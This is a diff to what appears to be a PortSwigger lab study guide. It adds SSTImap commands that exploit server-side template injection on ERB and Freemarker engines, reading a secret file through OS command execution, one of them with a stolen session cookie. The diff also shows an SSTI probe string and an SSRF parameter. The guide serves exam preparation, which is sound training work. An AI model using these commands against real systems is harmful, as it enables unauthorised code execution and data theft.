@@ -1240,7 +1240,13 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 >SSTI can be ***identified*** using the tool [SSTImap](https://github.com/vladko312/SSTImap) .  
 
 ```bash
-python /opt/SSTImap/sstimap.py -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /etc/hostname"
+python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
+```  
+
+>POST request data param to test and send payload using SSTImap.  
+
+```bash
+python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
 ```  
 
 ![SSTImap Tool](images/sstimap.png)  
@@ -1294,7 +1300,7 @@ ${{<%[%'"}}%\,
 
 [PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)  
 
->Freemarker Template  
+>Freemarker Template Content-Manager (C0nt3ntM4n4g3r)  
 
 ```
 ${foobar}
